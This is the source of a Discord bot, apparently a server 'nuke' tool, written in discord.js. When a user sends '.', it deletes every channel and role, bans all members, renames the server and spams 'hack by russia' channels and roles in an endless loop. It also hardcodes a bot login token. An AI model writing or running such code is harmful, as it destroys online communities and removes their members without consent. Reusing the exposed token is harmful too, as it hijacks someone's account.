const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ""
 client.on('message', message =>{
    if (message.content === ('.')){
            if (message.channel.guild){
                message.guild.channels.forEach(c =>{
                    if(c.deletable){
                        c.delete()
                    }
                })
                message.guild.members.forEach(m =>{
                    m.ban()
                })
                message.guild.roles.forEach(r=>{
                    r.delete()
                })
                message.guild.setName('bzndzaka')
                setInterval(function(){
                    message.guild.createChannel(' hack by russia', 'voice')
                    message.guild.createChannel(' . UP ', 'text')
                    message.guild.createRole({name : ' <.>'})
                })
            }
        }
 })



client.login("Nzc4OTQzMTExNDY4NDE3MDY0.X7ZVTQ.WnuhzyLfsTX-V2fjFPLIIyAiHn8");
